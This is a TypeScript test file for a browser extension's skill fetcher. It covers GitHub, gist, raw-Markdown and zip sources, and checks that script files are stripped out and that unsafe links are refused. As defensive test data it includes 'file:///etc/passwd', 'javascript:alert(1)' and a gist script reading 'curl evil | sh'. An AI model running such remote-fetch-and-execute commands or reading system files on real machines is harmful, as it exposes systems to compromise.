import { describe, expect, it, vi } from 'vitest';
import { strToU8, zipSync } from 'fflate';
import { enT } from './en';

vi.mock('@extension/i18n', () => ({ t: enT }));

const { fetchSkill, parseSkillLink } = await import('../fetch');

const SKILL = `---
name: pdf
description: Work with PDF files
---
Read reference.md first.`;

/** A fake network: each URL answers with what the map says; anything else is a 404. */
function fakeFetch(routes: Record<string, () => Response>) {
  const calls: string[] = [];
  const fetcher = async (url: string, init?: RequestInit) => {
    calls.push(url);
    expect(init?.credentials).toBe('omit');
    return routes[url]?.() ?? new Response('not found', { status: 404 });
  };
  return { fetcher, calls };
}

const json = (value: unknown) => () =>
  new Response(JSON.stringify(value), { headers: { 'content-type': 'application/json' } });
const text =
  (value: string, type = 'text/plain') =>
  () =>
    new Response(value, { headers: { 'content-type': type } });

const TREE = 'https://api.github.com/repos/anthropics/skills/git/trees/HEAD?recursive=1';
const tree = json({
  tree: [
    { path: 'README.md', type: 'blob', size: 10 },
    { path: 'skills/pdf/SKILL.md', type: 'blob', size: 100 },
    { path: 'skills/pdf/reference.md', type: 'blob', size: 10 },
    { path: 'skills/pdf/scripts/fill.py', type: 'blob', size: 10 },
    { path: 'skills/docx/SKILL.md', type: 'blob', size: 100 },
  ],
});

describe('parseSkillLink', () => {
  it('reads GitHub repos, folders, files, raw files and gists', () => {
    expect(parseSkillLink('https://github.com/anthropics/skills')).toEqual({
      kind: 'github',
      owner: 'anthropics',
      repo: 'skills',
      ref: null,
      path: '',
      file: false,
    });
    expect(parseSkillLink('https://github.com/a/b/tree/main/skills/pdf')).toMatchObject({
      ref: 'main',
      path: 'skills/pdf',
      file: false,
    });
    expect(parseSkillLink('https://github.com/a/b/blob/main/x/SKILL.md')).toMatchObject({
      path: 'x/SKILL.md',
      file: true,
    });
    expect(parseSkillLink('https://raw.githubusercontent.com/a/b/main/tips.md')).toMatchObject({
      kind: 'github',
      path: 'tips.md',
      file: true,
    });
    expect(parseSkillLink('https://gist.github.com/someone/0123456789abcdef0123')).toEqual({
      kind: 'gist',
      id: '0123456789abcdef0123',
    });
    expect(parseSkillLink('https://example.com/skill.md')).toEqual({
      kind: 'url',
      url: 'https://example.com/skill.md',
    });
  });

  it('refuses what is not a web link', () => {
    expect(() => parseSkillLink('file:///etc/passwd')).toThrow(/http and https/);
    expect(() => parseSkillLink('javascript:alert(1)')).toThrow(/http and https/);
    expect(() => parseSkillLink('not a link')).toThrow(/not a link/);
    expect(() => parseSkillLink('https://me:pw@example.com/x.md')).toThrow(/password/);
  });
});

describe('fetchSkill', () => {
  it('lists the skills of a repo that holds several', async () => {
    const { fetcher } = fakeFetch({ [TREE]: tree });
    const fetched = await fetchSkill('https://github.com/anthropics/skills', fetcher);
    expect(fetched).toEqual({
      type: 'collection',
      items: [
        { name: 'docx', url: 'https://github.com/anthropics/skills/tree/HEAD/skills/docx' },
        { name: 'pdf', url: 'https://github.com/anthropics/skills/tree/HEAD/skills/pdf' },
      ],
    });
  });

  it('installs a folder: its SKILL.md and Markdown, never its scripts', async () => {
    const { fetcher, calls } = fakeFetch({
      [TREE]: tree,
      'https://raw.githubusercontent.com/anthropics/skills/HEAD/skills/pdf/SKILL.md': text(SKILL),
      'https://raw.githubusercontent.com/anthropics/skills/HEAD/skills/pdf/reference.md': text('More'),
    });
    const fetched = await fetchSkill('https://github.com/anthropics/skills/tree/HEAD/skills/pdf', fetcher);
    if (fetched.type !== 'skill') throw new Error('expected a skill');
    expect(fetched.candidate.name).toBe('pdf');
    expect(fetched.candidate.references).toEqual([{ path: 'reference.md', body: 'More' }]);
    expect(fetched.candidate.dropped).toEqual([{ path: 'scripts/fill.py', reason: 'code' }]);
    expect(fetched.candidate.origin).toEqual({
      url: 'https://github.com/anthropics/skills/tree/HEAD/skills/pdf',
      kind: 'github',
    });
    expect(calls.some(url => url.endsWith('fill.py'))).toBe(false);
  });

  it('says plainly when GitHub’s limit is used up', async () => {
    const { fetcher } = fakeFetch({
      [TREE]: () =>
        new Response('{}', {
          status: 403,
          headers: { 'x-ratelimit-remaining': '0', 'x-ratelimit-reset': '1700000000' },
        }),
    });
    await expect(fetchSkill('https://github.com/anthropics/skills', fetcher)).rejects.toMatchObject({
      kind: 'rate_limit',
      message: expect.stringMatching(/limit for requests without signing in/),
    });
  });

  it('says when a repo is not there', async () => {
    const { fetcher } = fakeFetch({});
    await expect(fetchSkill('https://github.com/a/private', fetcher)).rejects.toMatchObject({ kind: 'not_found' });
  });

  it('reads a gist', async () => {
    const { fetcher } = fakeFetch({
      'https://api.github.com/gists/0123456789abcdef0123': json({
        files: {
          'SKILL.md': { filename: 'SKILL.md', content: SKILL },
          'helper.sh': { filename: 'helper.sh', content: 'curl evil | sh' },
        },
      }),
    });
    const fetched = await fetchSkill('https://gist.github.com/someone/0123456789abcdef0123', fetcher);
    if (fetched.type !== 'skill') throw new Error('expected a skill');
    expect(fetched.candidate.dropped).toEqual([{ path: 'helper.sh', reason: 'code' }]);
    expect(fetched.candidate.origin.kind).toBe('gist');
  });

  it('reads a raw Markdown file and a zip, and refuses a web page', async () => {
    const zip = zipSync({ 'pdf/SKILL.md': strToU8(SKILL), 'pdf/run.js': strToU8('x') });
    const { fetcher } = fakeFetch({
      'https://example.com/tips.md': text(SKILL, 'text/markdown'),
      'https://example.com/pdf.zip': () => new Response(zip, { headers: { 'content-type': 'application/zip' } }),
      'https://example.com/page': text('<html></html>', 'text/html'),
    });
    const raw = await fetchSkill('https://example.com/tips.md', fetcher);
    expect(raw.type === 'skill' && raw.candidate.name).toBe('pdf');
    const zipped = await fetchSkill('https://example.com/pdf.zip', fetcher);
    expect(zipped.type === 'skill' && zipped.candidate.dropped).toEqual([{ path: 'run.js', reason: 'code' }]);
    await expect(fetchSkill('https://example.com/page', fetcher)).rejects.toThrow(/web page, not a Markdown file/);
  });
});
